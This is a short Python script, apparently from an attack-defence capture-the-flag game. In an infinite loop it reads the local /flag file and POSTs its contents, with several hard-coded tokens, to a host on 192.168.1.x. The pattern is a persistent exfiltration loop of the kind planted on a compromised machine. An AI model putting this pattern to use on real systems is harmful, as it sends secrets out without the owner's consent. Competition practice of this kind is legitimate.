#coding=utf-8
import requests,time

ip = [183]
port = "80"
url = "http://192.168.1."
admin_url = 'http://192.168.1.183/'
target_num = {'福建拉福建拉','311F8A54SV9K6B5FF4EAB20535','311F8A54SV9K6B5FF4EAB20537'}

headers = {
'Content-Type':'application/x-www-form-urlencoded',

         }

while (1):
    flags=open('/flag','r')
    flag = flags.read()
    flags.close
    for j in target_num:
        data ={'flag':flag,'token':j}
        for i in ip:
            re = requests.post(admin_url,data=data)
            time.sleep(1)
